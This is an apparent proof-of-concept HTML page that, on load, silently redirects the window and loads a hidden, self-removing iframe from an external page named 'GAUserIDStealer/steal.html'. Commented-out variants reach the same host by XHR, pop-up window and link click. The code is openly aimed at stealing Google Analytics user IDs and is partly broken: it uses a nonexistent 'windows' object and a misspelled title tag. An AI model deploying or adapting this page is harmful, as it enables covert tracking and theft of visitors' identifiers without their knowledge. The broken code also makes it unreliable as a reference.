<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <titile>Document</titile>
<!--     <iframe id="cframe" style="display:none"></iframe> -->
    <script>
    function makeid(length) {
        var result           = '';
        var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        var charactersLength = characters.length;
        for ( var i = 0; i < length; i++ ) {
           result += characters.charAt(Math.floor(Math.random() * charactersLength));
        }
        return result;
     }
     
   
     function doFlow(){
        
         console.log('A origin loacation: ',window.location.origin);
         console.log('A window top !== window', window.top!==window);
         
         windows.self.location='https://newmangervase91.github.io/GAUserIDStealer/steal.html';
         windows.top.location='https://newmangervase91.github.io/GAUserIDStealer/steal.html'  
         
         console.log('after self/top origin: A',window.location.origin);
         console.log('after A: TOP',window.top.location);
         console.log('after A: self',window.self.location);
         
         
         var guhappyId=makeid(5);
         var ifrm_c = document.createElement('iframe');
         ifrm_c.setAttribute('id', guhappyId);
         ifrm_c.setAttribute('class', 'guhappy_steal');
         ifrm_c.style.display = "none";
         document.head.appendChild(ifrm_c);
         
         var cframe=document.getElementById(guhappyId);
         
//          var cframe=document.getElementById("cframe");
         
         cframe.addEventListener("load",function(){
             setTimeout(function(){
                 cframe.parentNode.removeChild(cframe);
                 cframe.parentNode=null;
             }, 5000);
             
         });
         
    
         cframe.src ="https://newmangervase91.github.io/GAUserIDStealer/steal.html";
         
         
//         var xhr = new XMLHttpRequest(),
//         method = "GET",
//         url = "https://newmangervase91.github.io/GAUserIDStealer/steal.html";

//         xhr.open(method, url, true);
//         xhr.onreadystatechange = function () {
//                 if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//                     console.log(xhr.responseText);
//                 }
//             };
//         xhr.send();
//          createWindow = setTimeout(function(){window.open("https://newmangervase91.github.io/GAUserIDStealer/steal.html")}, 1000);
//          close_w = setTimeout(function(){createWindow.close()}, 1000);
         
//          var a = document.createElement('a');
//          element.setAttribute('href', 'https://newmangervase91.github.io/GAUserIDStealer/steal.html');
//          element.setAttribute('target', '_blank');
//          a.target="_blank";
//          a.href="https://newmangervase91.github.io/GAUserIDStealer/steal.html";
//          document.body.appendChild(a);
//          a.click();
//          createWindow = setTimeout(function(){window.open("https://newmangervase91.github.io/GAUserIDStealer/steal.html")}, 500);
//          close_w = setTimeout(function(){createWindow.close()}, 1000);
     }
     doFlow();
    </script>
</head>

<body>
    
<!--     <script>
        console.log('A',window.location.origin);
        console.log('A window top !== window', window.top!==window);
    </script> -->
</body>

</html>
